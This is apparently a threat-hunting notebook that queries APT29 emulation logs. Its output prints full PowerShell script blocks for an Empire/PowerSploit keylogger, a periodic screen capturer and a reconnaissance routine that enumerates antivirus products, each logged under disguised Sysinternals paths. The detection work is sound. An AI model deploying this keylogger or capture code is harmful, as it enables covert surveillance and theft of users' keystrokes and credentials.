                    if ($LeftMouse)    {$Outout += &#39;[Left Mouse]&#39;}
                    if ($RightMouse)   {$Outout += &#39;[Right Mouse]&#39;}

                    #check for capslock
                    if ([Console]::CapsLock) {$Outout += &#39;[Caps Lock]&#39;}

                    $scancode = $ImportDll::MapVirtualKey($vkey, 0x3)
                    
                    $kbstate = New-Object Byte[] 256
                    $checkkbstate = $ImportDll::GetKeyboardState($kbstate)
                    
                    $mychar = New-Object -TypeName &quot;System.Text.StringBuilder&quot;;
                    $unicode_res = $ImportDll::ToUnicode($vkey, $scancode, $kbstate, $mychar, $mychar.Capacity, 0)

                    #get the title of the foreground window
                    $TopWindow = $ImportDll::GetForegroundWindow()
                    $WindowTitle = (Get-Process | Where-Object { $_.MainWindowHandle -eq $TopWindow }).MainWindowTitle
                    
                    if ($unicode_res -gt 0) {
                        if ($WindowTitle -ne $LastWindowTitle){
                            # if the window has changed
                            $TimeStamp = (Get-Date -Format dd/MM/yyyy:HH:mm:ss:ff)
                            $Outout = &quot;`n`n$WindowTitle - $TimeStamp`n&quot;
                            $LastWindowTitle = $WindowTitle
                        }
                        $Outout += $mychar.ToString()
                        $Outout
                    }
                }
            }
        }
    }
}

ScriptBlock ID: fa9f2b3a-3f5e-4d3c-93c9-7172cc073add
Path: C:\Program Files\SysinternalsSuite\psversion.ps1 
-RECORD 1-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Creating Scriptblock text (1 of 1):
function Invoke-ScreenCapture
# https://www.pdq.com/blog/capturing-screenshots-with-powershell-and-net/
{
    Start-Job -Name &quot;Screenshot&quot; -ScriptBlock { 
        Write-Host &quot;`nJobPID`n------`n$PID&quot;
        while($true){
            $RandomFileName = [System.IO.Path]::GetRandomFileName(); 
            $Filepath=&quot;$env:USERPROFILE\Downloads\$RandomFileName.bmp&quot;; 
            Add-Type -AssemblyName System.Windows.Forms; 
            Add-type -AssemblyName System.Drawing; 
            $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen; 
            $Width = $Screen.Width; 
            $Height = $Screen.Height; 
            $Left = $Screen.Left; 
            $Top = $Screen.Top; 
            $bitmap = New-Object System.Drawing.Bitmap $Width, $Height; 
            $graphic = [System.Drawing.Graphics]::FromImage($bitmap); 
            $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size); 
            $bitmap.Save($Filepath); 
            Start-Sleep -Seconds 300
        } 
    }
}

ScriptBlock ID: b91c2ae7-3a03-49df-8d2a-4c42fc79df56
Path: C:\Program Files\SysinternalsSuite\psversion.ps1                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
-RECORD 2-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Creating Scriptblock text (1 of 1):
function Invoke-Discovery {
    $DiscoveryInfo =@()
    $CurrentDir = Get-Location

    $DiscoveryInfo += [PSCustomObject]@{
                CurrentDirectory = $CurrentDir
                TempDirectory = $env:TEMP
                UserName = $env:USERNAME
                ComputerName = $env:COMPUTERNAME
                UserDomain = $env:USERDOMAIN
                CurrentPID = $PID
            }

    $DiscoveryInfo | Format-List
    
    $NameSpace = Get-WmiObject -Namespace &quot;root&quot; -Class &quot;__Namespace&quot; | Select Name | Out-String -Stream | Select-String &quot;SecurityCenter&quot;
    foreach ($SecurityCenter in $NameSpace) { 
        Get-WmiObject -Namespace &quot;root\$SecurityCenter&quot; -Class AntiVirusProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List
        WmiObject -Namespace &quot;root\$SecurityCenter&quot; -Class FireWallProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List 
    } 

    Gwmi Win32_OperatingSystem | Select Name, OSArchitecture, CSName, BuildNumber, Version | Format-List
    Invoke-NetUserGetGroups
    Invoke-NetUserGetLocalGroups
}

ScriptBlock ID: 70878299-2ee1-4a5d-869f-124b349aee1d
Path: C:\Program Files\SysinternalsSuite\readme.ps1                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
</pre></div>
</div>
</div>
</div>
<p><strong>Query ID:9CFC783B-2DC8-4A3D-AC7B-2DF890827E2E</strong></p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
<span class="sd">&#39;&#39;&#39;</span>
<span class="sd">SELECT Message</span>
<span class="sd">FROM apt29Host f</span>
<span class="sd">INNER JOIN (</span>
<span class="sd">  SELECT split(d.NewProcessId, &#39;0x&#39;)[1] as NewProcessId</span>
<span class="sd">  FROM apt29Host d</span>
<span class="sd">  INNER JOIN(</span>
<span class="sd">    SELECT a.ProcessId, a.NewProcessId</span>
<span class="sd">    FROM apt29Host a</span>
<span class="sd">    INNER JOIN (</span>
<span class="sd">      SELECT NewProcessId</span>
<span class="sd">      FROM apt29Host</span>
<span class="sd">      WHERE LOWER(Channel) = &quot;security&quot;</span>
<span class="sd">          AND EventID = 4688</span>
<span class="sd">          AND LOWER(NewProcessName) LIKE &quot;%control.exe&quot;</span>
<span class="sd">          AND LOWER(ParentProcessName) LIKE &quot;%sdclt.exe&quot;</span>
<span class="sd">    ) b</span>
<span class="sd">    ON a.ProcessId = b.NewProcessId</span>
<span class="sd">    WHERE LOWER(a.Channel) = &quot;security&quot;</span>
<span class="sd">      AND a.EventID = 4688</span>
<span class="sd">      AND a.MandatoryLabel = &quot;S-1-16-12288&quot;</span>
<span class="sd">      AND a.TokenElevationType = &quot;%%1937&quot;</span>
<span class="sd">  ) c</span>
<span class="sd">  ON d.ProcessId = c.NewProcessId</span>
<span class="sd">  WHERE LOWER(d.Channel) = &quot;security&quot;</span>
<span class="sd">    AND d.EventID = 4688</span>
<span class="sd">    AND d.NewProcessName LIKE &#39;%powershell.exe&#39;</span>
<span class="sd">) e</span>
<span class="sd">ON LOWER(hex(f.ExecutionProcessID)) = e.NewProcessId</span>
<span class="sd">WHERE f.Channel = &quot;Microsoft-Windows-PowerShell/Operational&quot;</span>
<span class="sd">  AND f.EventID = 4104</span>
<span class="sd">  AND LOWER(f.ScriptBlockText) LIKE &quot;%$pid%&quot;</span>

<span class="sd">&#39;&#39;&#39;</span>
<span class="p">)</span>
<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span><span class="n">truncate</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span> <span class="n">vertical</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>-RECORD 0-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Message | Creating Scriptblock text (1 of 1):
function Get-Keystrokes {
&lt;#
.SYNOPSIS
 
    Logs keys pressed, time and the active window (when changed).
    Some modifications for Empire by @harmj0y.
    
    PowerSploit Function: Get-Keystrokes
    Author: Chris Campbell (@obscuresec) and Matthew Graeber (@mattifestation)
    Modifications: @harmj0y
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
    
.LINK
    http://www.obscuresec.com/
    http://www.exploit-monday.com/
#&gt;
    Start-Job -Name &quot;Keystrokes&quot; -ScriptBlock {
        Write-Host &quot;`nJobPID`n------`n$PID&quot;
        [Reflection.Assembly]::LoadWithPartialName(&#39;System.Windows.Forms&#39;) | Out-Null

        try
        {
            $ImportDll = [User32]
        }
        catch
        {
            $DynAssembly = New-Object System.Reflection.AssemblyName(&#39;Win32Lib&#39;)
            $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
            $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule(&#39;Win32Lib&#39;, $False)
            $TypeBuilder = $ModuleBuilder.DefineType(&#39;User32&#39;, &#39;Public, Class&#39;)

            $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
            $FieldArray = [Reflection.FieldInfo[]] @(
                [Runtime.InteropServices.DllImportAttribute].GetField(&#39;EntryPoint&#39;),
                [Runtime.InteropServices.DllImportAttribute].GetField(&#39;ExactSpelling&#39;),
                [Runtime.InteropServices.DllImportAttribute].GetField(&#39;SetLastError&#39;),
                [Runtime.InteropServices.DllImportAttribute].GetField(&#39;PreserveSig&#39;),
                [Runtime.InteropServices.DllImportAttribute].GetField(&#39;CallingConvention&#39;),
                [Runtime.InteropServices.DllImportAttribute].GetField(&#39;CharSet&#39;)
            )

            $PInvokeMethod = $TypeBuilder.DefineMethod(&#39;GetAsyncKeyState&#39;, &#39;Public, Static&#39;, [Int16], [Type[]] @([Windows.Forms.Keys]))
            $FieldValueArray = [Object[]] @(
                &#39;GetAsyncKeyState&#39;,
                $True,
                $False,
                $True,
                [Runtime.InteropServices.CallingConvention]::Winapi,
                [Runtime.InteropServices.CharSet]::Auto
            )
            $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @(&#39;user32.dll&#39;), $FieldArray, $FieldValueArray)
            $PInvokeMethod.SetCustomAttribute($CustomAttribute)

            $PInvokeMethod = $TypeBuilder.DefineMethod(&#39;GetKeyboardState&#39;, &#39;Public, Static&#39;, [Int32], [Type[]] @([Byte[]]))
            $FieldValueArray = [Object[]] @(
                &#39;GetKeyboardState&#39;,
                $True,
                $False,
                $True,
                [Runtime.InteropServices.CallingConvention]::Winapi,
                [Runtime.InteropServices.CharSet]::Auto
            )
            $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @(&#39;user32.dll&#39;), $FieldArray, $FieldValueArray)
            $PInvokeMethod.SetCustomAttribute($CustomAttribute)

            $PInvokeMethod = $TypeBuilder.DefineMethod(&#39;MapVirtualKey&#39;, &#39;Public, Static&#39;, [Int32], [Type[]] @([Int32], [Int32]))
            $FieldValueArray = [Object[]] @(
                &#39;MapVirtualKey&#39;,
                $False,
                $False,
                $True,
                [Runtime.InteropServices.CallingConvention]::Winapi,
                [Runtime.InteropServices.CharSet]::Auto
            )
            $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @(&#39;user32.dll&#39;), $FieldArray, $FieldValueArray)
            $PInvokeMethod.SetCustomAttribute($CustomAttribute)

            $PInvokeMethod = $TypeBuilder.DefineMethod(&#39;ToUnicode&#39;, &#39;Public, Static&#39;, [Int32],
                [Type[]] @([UInt32], [UInt32], [Byte[]], [Text.StringBuilder], [Int32], [UInt32]))
            $FieldValueArray = [Object[]] @(
                &#39;ToUnicode&#39;,
                $False,
                $False,
                $True,
                [Runtime.InteropServices.CallingConvention]::Winapi,
                [Runtime.InteropServices.CharSet]::Auto
            )
            $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @(&#39;user32.dll&#39;), $FieldArray, $FieldValueArray)
            $PInvokeMethod.SetCustomAttribute($CustomAttribute)

            $PInvokeMethod = $TypeBuilder.DefineMethod(&#39;GetForegroundWindow&#39;, &#39;Public, Static&#39;, [IntPtr], [Type[]] @())
            $FieldValueArray = [Object[]] @(
                &#39;GetForegroundWindow&#39;,
                $True,
                $False,
                $True,
                [Runtime.InteropServices.CallingConvention]::Winapi,
                [Runtime.InteropServices.CharSet]::Auto
            )
            $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @(&#39;user32.dll&#39;), $FieldArray, $FieldValueArray)
            $PInvokeMethod.SetCustomAttribute($CustomAttribute)

            $ImportDll = $TypeBuilder.CreateType()
        }

        $LastWindowTitle = &quot;&quot;
        $i=0
        while ($true) {
            Start-Sleep -Milliseconds 40
            $gotit = &quot;&quot;
            $Outout = &quot;&quot;
            
            for ($char = 1; $char -le 254; $char++) {
                $vkey = $char
                $gotit = $ImportDll::GetAsyncKeyState($vkey)
                
                if ($gotit -eq -32767) {

                    #check for keys not mapped by virtual keyboard
                    $LeftShift    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LShiftKey) -band 0x8000) -eq 0x8000
                    $RightShift   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RShiftKey) -band 0x8000) -eq 0x8000
                    $LeftCtrl     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LControlKey) -band 0x8000) -eq 0x8000
                    $RightCtrl    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RControlKey) -band 0x8000) -eq 0x8000
                    $LeftAlt      = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LMenu) -band 0x8000) -eq 0x8000
                    $RightAlt     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RMenu) -band 0x8000) -eq 0x8000
                    $TabKey       = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Tab) -band 0x8000) -eq 0x8000
                    $SpaceBar     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Space) -band 0x8000) -eq 0x8000
                    $DeleteKey    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Delete) -band 0x8000) -eq 0x8000
                    $EnterKey     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Return) -band 0x8000) -eq 0x8000
                    $BackSpaceKey = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Back) -band 0x8000) -eq 0x8000
                    $LeftArrow    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Left) -band 0x8000) -eq 0x8000
                    $RightArrow   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Right) -band 0x8000) -eq 0x8000
                    $UpArrow      = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Up) -band 0x8000) -eq 0x8000
                    $DownArrow    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Down) -band 0x8000) -eq 0x8000
                    $LeftMouse    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LButton) -band 0x8000) -eq 0x8000
                    $RightMouse   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RButton) -band 0x8000) -eq 0x8000

                    if ($LeftShift -or $RightShift) {$Outout += &#39;[Shift]&#39;}
                    if ($LeftCtrl  -or $RightCtrl)  {$Outout += &#39;[Ctrl]&#39;}
                    if ($LeftAlt   -or $RightAlt)   {$Outout += &#39;[Alt]&#39;}
                    if ($TabKey)       {$Outout += &#39;[Tab]&#39;}
                    if ($SpaceBar)     {$Outout += &#39;[SpaceBar]&#39;}
                    if ($DeleteKey)    {$Outout += &#39;[Delete]&#39;}
                    if ($EnterKey)     {$Outout += &#39;[Enter]&#39;}
                    if ($BackSpaceKey) {$Outout += &#39;[Backspace]&#39;}
                    if ($LeftArrow)    {$Outout += &#39;[Left Arrow]&#39;}
                    if ($RightArrow)   {$Outout += &#39;[Right Arrow]&#39;}
                    if ($UpArrow)      {$Outout += &#39;[Up Arrow]&#39;}
                    if ($DownArrow)    {$Outout += &#39;[Down Arrow]&#39;}
                    if ($LeftMouse)    {$Outout += &#39;[Left Mouse]&#39;}
                    if ($RightMouse)   {$Outout += &#39;[Right Mouse]&#39;}

                    #check for capslock
                    if ([Console]::CapsLock) {$Outout += &#39;[Caps Lock]&#39;}

                    $scancode = $ImportDll::MapVirtualKey($vkey, 0x3)
                    
                    $kbstate = New-Object Byte[] 256
                    $checkkbstate = $ImportDll::GetKeyboardState($kbstate)
                    
                    $mychar = New-Object -TypeName &quot;System.Text.StringBuilder&quot;;
                    $unicode_res = $ImportDll::ToUnicode($vkey, $scancode, $kbstate, $mychar, $mychar.Capacity, 0)

                    #get the title of the foreground window
                    $TopWindow = $ImportDll::GetForegroundWindow()
                    $WindowTitle = (Get-Process | Where-Object { $_.MainWindowHandle -eq $TopWindow }).MainWindowTitle
                    
                    if ($unicode_res -gt 0) {
                        if ($WindowTitle -ne $LastWindowTitle){
                            # if the window has changed
                            $TimeStamp = (Get-Date -Format dd/MM/yyyy:HH:mm:ss:ff)
                            $Outout = &quot;`n`n$WindowTitle - $TimeStamp`n&quot;
                            $LastWindowTitle = $WindowTitle
                        }
                        $Outout += $mychar.ToString()
                        $Outout
                    }
                }
            }
        }
    }
}

ScriptBlock ID: fa9f2b3a-3f5e-4d3c-93c9-7172cc073add
Path: C:\Program Files\SysinternalsSuite\psversion.ps1 
-RECORD 1---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------